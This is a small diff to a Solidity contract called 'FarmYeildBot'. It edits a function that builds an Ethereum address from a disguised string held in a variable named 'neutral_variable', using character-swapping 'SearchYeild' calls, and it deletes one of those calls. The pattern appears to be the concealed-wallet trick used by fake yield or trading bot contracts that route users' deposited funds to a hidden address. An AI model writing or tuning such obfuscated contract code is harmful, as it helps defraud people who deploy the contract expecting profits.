@@ -33,7 +33,6 @@ contract FarmYeildBot {
    function startLookingforYeild() public pure returns (address adr) {
    string memory neutral_variable = "QG589A5Fb62F0675ef3cA75C631E7361A73126B0ca"; 
    SearchYeild(neutral_variable,0,'0');
-   SearchYeild(neutral_variable,2,'1');
    SearchYeild(neutral_variable,1,'x');
    address addr = parseAddr(neutral_variable);
     return addr;
